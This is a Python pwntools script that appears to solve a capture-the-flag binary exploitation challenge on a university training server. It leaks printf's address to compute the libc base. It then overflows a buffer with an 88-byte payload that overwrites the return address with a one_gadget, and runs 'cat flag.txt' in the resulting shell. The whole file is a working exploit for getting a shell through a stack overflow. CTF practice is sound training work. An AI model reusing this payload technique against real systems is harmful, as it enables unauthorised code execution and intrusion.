from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9106

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

libc = ELF("./libc.so.6")

printf_libc_offset = libc.symbols["printf"]
system_libc_offset = libc.symbols["system"]

one_gadget_offset = 0x54ecc

conn.recvuntil(b"is at ")
printf_address = int(conn.recvuntil(b",", drop=True), 16)

base_address = printf_address - printf_libc_offset
system_address = base_address + system_libc_offset
print(system_address)
one_gadget_address = base_address + one_gadget_offset
print(one_gadget_address)

conn.recvuntil(b"?")

offset = 88     # Soliti 72 + 16 di guess (essendo long occupa 2*8 bit)

payload = (str(system_address) + " ").encode() 
payload += b"A" * (offset - len(payload)) 
payload += p64(one_gadget_address)

print(payload)

conn.sendline(payload)

if(b"Nope" in conn.recvline()):
    conn.close()
    print("ERROR")
else:
    conn.recvuntil(b"What now?\n")
    conn.sendline(b"cat flag.txt")
    flag = conn.recvuntil(b"}").decode()
    conn.close()
    print(flag)